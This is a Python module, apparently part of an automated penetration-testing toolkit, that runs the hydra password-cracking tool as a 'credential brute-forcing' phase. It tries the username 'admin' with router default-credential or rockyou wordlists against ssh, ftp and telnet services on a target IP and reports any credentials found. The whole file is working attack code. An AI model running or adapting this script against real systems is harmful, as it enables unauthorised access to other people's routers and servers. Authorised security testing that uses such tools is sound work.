import os
from core.utils import run_cmd, TOOLS_DIR

HYDRA_CMD = "hydra"

def run_hydra(ip, login_ports, target_dir):
    print("\n======================================================")
    print(">>> PHASE 4: Credential Brute-Forcing (Last Resort)")
    print("======================================================")
    
    passwords_file = os.path.join(TOOLS_DIR, "DefaultCreds-cheat-sheet", "routers.txt")
    if not os.path.exists(passwords_file):
        passwords_file = "/usr/share/wordlists/rockyou.txt"
    
    user = "admin"
    success_flag = False
    
    for lp in login_ports:
        port = lp['port']
        service = lp['service']
        print(f"\n[+] Brute-forcing {service} on port {port}...")
        
        if service in ['ssh', 'ftp', 'telnet']:
            target_str = f"{service}://{ip}:{port}"
            log_file = os.path.join(target_dir, f"hydra_{service}_{port}.txt")
            command = [HYDRA_CMD, "-l", user, "-P", passwords_file, "-t", "4", target_str]
            
            success, output = run_cmd(command, capture=True, log_file=log_file)
            if output:
                print(output)
                print(f"[+] Hydra {service} results saved to: {log_file}")
                
            if "login:" in output.lower() and "password:" in output.lower():
                print(f"[!] SUCCESS! Credentials found for {service}!")
                success_flag = True
                
    return success_flag
